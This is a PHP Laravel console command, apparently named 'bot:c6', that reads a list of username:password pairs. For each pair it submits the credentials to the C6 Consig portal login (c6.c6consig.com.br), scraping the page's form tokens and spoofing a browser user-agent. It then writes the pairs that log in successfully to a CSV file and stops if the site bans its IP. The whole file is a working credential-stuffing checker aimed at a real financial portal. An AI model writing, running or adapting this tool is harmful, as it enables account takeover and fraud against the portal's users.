<?php

namespace App\Console\Commands\BOT;

use GuzzleHttp\Client;
use GuzzleHttp\Promise\Utils;
use GuzzleHttp\Exception\ClientException;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Cookie\SetCookie;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Storage;
use Symfony\Component\Console\Helper\ProgressBar;

class C6 extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'bot:c6 {--file=} {--output=} {--overwrite}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';


    private $handler_in;
    private $handler_out;
    private bool $overwrite = false;

    /**
     * Execute the console command.
     */
    public function handle()
    {
        // Prepare Guzzle Client
        $client = new Client([
            'base_uri' => "https://c6.c6consig.com.br",
            'timeout' => 10.0,
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            ],
        ]);

        $in = Storage::disk('in');

        $anticipate_files = $in->files();
        $filename_in = $this->option('file') ?? $this->anticipate('Por favor, selecione o arquivo a ser processado', $anticipate_files);

        if ($filename_in === null) {
            $this->error('Nenhum arquivo selecionado');
            return Command::FAILURE;
        }

        if (!$in->exists($filename_in)) {
            $this->error('Não foi possível encontrar o arquivo ' . $filename_in);
            return Command::FAILURE;
        }

        $out = Storage::disk('out');

        $filename_out = $this->option('output') ?? $this->ask('Por favor, informe o nome do arquivo de saída', 'output.csv');

        $path_in = $in->path($filename_in);
        $path_out = $out->path($filename_out);

        $this->overwrite = $this->option('overwrite');
        if ($out->exists($filename_out) && !$this->overwrite) {
            if (!($this->overwrite = $this->confirm('Deseja sobrescrever o arquivo de saída?'))) {
                return Command::FAILURE;
            }
        }

        $this->info("\n> Arquivo de entrada: {$filename_in}");
        $this->info("> Arquivo de saída: {$filename_out}");

        $this->handler_in = fopen($path_in, 'r');
        $this->handler_out = fopen($path_out, 'w');

        // Prepare Guzzle Promises
        $promises = [];

        $line = 0;

        while (($_data = fgetcsv($this->handler_in, 0, ';')) !== false) {
            $line++;
            $this->newLine();

            $data = explode(':', $_data[0]);
            $username = $data[0] ?? null;
            $password = $data[1] ?? null;
            if ($username === null || $password === null) {
                $this->error("Linha {$line} inválida: null:null");
                continue;
            }

            $this->line("[{$line}]: Processando {$username}");
            $hash = sha1($username . $password);
            $cache_tag = "BOT:C6:{$hash}";

            if (!Cache::has($cache_tag)) {
                try {
                    $response = @$client->get('/WebAutorizador/Login/AC.UI.LOGIN.aspx', [
                        'query' => [
                            'FISession' => '600aa1897dc8',
                        ],
                    ]);

                    $headerSetCookies = $response->getHeader('Set-Cookie');
                    $cookies = [];
                    foreach ($headerSetCookies as $key => $header) {
                        $cookie = SetCookie::fromString($header);
                        $cookie->setDomain('c6.c6consig.com.br');
                        $cookies[] = $cookie;
                    }
                    $cookieJar = new CookieJar(false, $cookies);

                    if ($response->getStatusCode() !== 200) {
                        $this->error("[{$line}]: Erro ao processar {$username}:{$password}.");
                        continue;
                    }

                    $body = $response->getBody()->getContents();

                    preg_match('/<form.*?>(.*?)<\/form>/s', $body, $matches);
                    // Get all inputs
                    $inputs = [];
                    preg_match_all('/<input.*?\/>/s', $matches[1], $inputs);

                    // Parse inputs
                    $form = [];
                    foreach ($inputs[0] as $input) {
                        $name = preg_match('/name="(.*?)"/', $input, $matches) ? $matches[1] : null;
                        $value = preg_match('/value="(.*?)"/', $input, $matches) ? $matches[1] : null;
                        $form[$name] = $value;
                    }

                    $__VIEWSTATE = $form['__VIEWSTATE'] ?? null;
                    $__VIEWSTATEGENERATOR = $form['__VIEWSTATEGENERATOR'] ?? null;
                    $__EVENTVALIDATION = $form['__EVENTVALIDATION'] ?? null;

                    if ($__VIEWSTATE === null || $__VIEWSTATEGENERATOR === null || $__EVENTVALIDATION === null) {
                        $this->error("[{$line}]: Erro ao processar {$username}:{$password}.");
                        continue;
                    }

                    $form = [
                        'scManager' => 'updLogin|lnkEntrar',
                        '__LASTFOCUS' => '',
                        '__EVENTTARGET' => 'lnkEntrar',
                        '__EVENTARGUMENT' => '',
                        '__VIEWSTATE' => $__VIEWSTATE,
                        '__VIEWSTATEGENERATOR' => $__VIEWSTATEGENERATOR,
                        '__EVENTVALIDATION' => $__EVENTVALIDATION,
                        'EUsuario$CAMPO' => $username,
                        'ESenha$CAMPO' => $password,
                        '__ASYNCPOST' => 'true',
                    ];

                    $response = $client->post('/WebAutorizador/Login/AC.UI.LOGIN.aspx', [
                        'form_params' => $form,
                        'query' => [
                            'FISession' => '600aa1897dc8',
                        ],
                        'cookies' => $cookieJar,
                    ]);

                    $body = $response->getBody()->getContents();

                    $valid = Cache::remember($cache_tag, now()->second(1), function () use ($body) {
                        return str_contains($body, 'Usuário ou senha inválido');
                    });

                    $inactive = Cache::remember($cache_tag, now()->second(1), function () use ($body) {
                        return str_contains($body, 'Usuário inativo ou afastado');
                    });
                } catch (ClientException $e) {
                    $body = $e->getResponse()->getBody()->getContents();

                    if (str_contains($body, 'The owner of this website (c6.c6consig.com.br) has banned your IP address')) {
                        $this->error("Impossível acessar o site, IP bloqueado.");
                        return Command::FAILURE;
                    } elseif (str_contains($body, 'error code: 1006')) {
                        $this->error("Impossível acessar o site, conexão recusada.");
                        return Command::FAILURE;
                    } else {
                        $this->error("[{$line}]: Erro ao processar {$username}:{$password}.");
                        continue;
                    }
                }
            } else {
                $valid = Cache::get($cache_tag);
                $inactive = Cache::get($cache_tag);
            }

            if ($valid) {
                $this->warn("[{$line}]: {$username}:{$password} inválido.");
                continue;
            }

            if ($inactive) {
                $this->warn("[{$line}]: {$username}:{$password} válido, porém o usuário inativo ou afastado.");
                continue;
            }

            $this->info("[{$line}]: {$username}:{$password} válido.");
            // add user to output file
            fputcsv($this->handler_out, [$username, $password], ';');
        }

        fclose($this->handler_in);
        fclose($this->handler_out);

        $this->info("\n> Arquivo de saída gerado com sucesso: {$filename_out}");

        return Command::SUCCESS;
    }
}
